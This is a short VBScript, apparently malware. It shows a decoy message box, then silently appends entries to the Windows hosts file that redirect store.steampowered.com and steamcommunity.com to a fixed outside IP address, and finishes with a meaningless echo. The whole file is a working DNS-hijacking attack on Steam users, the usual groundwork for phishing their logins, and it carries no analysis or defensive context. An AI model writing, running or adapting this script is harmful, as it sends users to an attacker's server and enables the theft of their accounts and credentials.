msgbox "1"
Set wshshell=wscript.CreateObject("WScript.Shell")
wshshell.run "cmd /c echo. >> C:\WINDOWS\system32\drivers\etc\hosts",0
WScript.Sleep(500)
wshshell.run "cmd /c echo 103.86.70.254 store.steampowered.com >> C:\WINDOWS\system32\drivers\etc\hosts",0
WScript.Sleep(500)
wshshell.run "cmd /c echo 103.86.70.254 steamcommunity.com >> C:\WINDOWS\system32\drivers\etc\hosts",0
WScript.Sleep(500)
WScript.Echo "qqss"